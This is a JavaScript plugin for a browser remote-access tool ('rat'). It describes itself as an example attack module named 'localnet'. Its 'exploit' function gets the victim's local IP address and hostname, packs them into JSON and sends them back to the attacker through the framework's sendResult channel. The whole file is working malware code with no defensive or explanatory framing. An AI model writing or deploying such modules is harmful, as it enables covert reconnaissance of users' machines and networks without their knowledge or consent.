// JavaScript Document
/**
 *  a example of attack module 
 *  @modulename localnet
 *  get client local network  
 *
 **/
 
 rat.module.localnet = {
	getLocalIP: function(){
		var localIP =  rat.net.local.getLocalAddress();
		if(!localIP) rat.module.sendLog("Browser Not Suport Java");
		return localIP?localIP:"Unkown";
	},
	getLocalHostName:function(){
		var localHostName = rat.net.local.getLocalHostname();
		if(!localHostName) rat.module.sendLog("Browser Not Suport Java");
		return localHostName?localHostName:"Unkown";
	},
	/**
	*   the entrance function of the module
	*
	**/
	exploit:function(){
		var result = "{\"LocalIP\":\""+this.getLocalIP()+"\",\"HostName\":\""+this.getLocalHostName()+"\"}";
		rat.module.sendResult(result);
	}
 }
 
 //继承module 类
 rat.extend(true,rat.module.localnet,rat.module);
 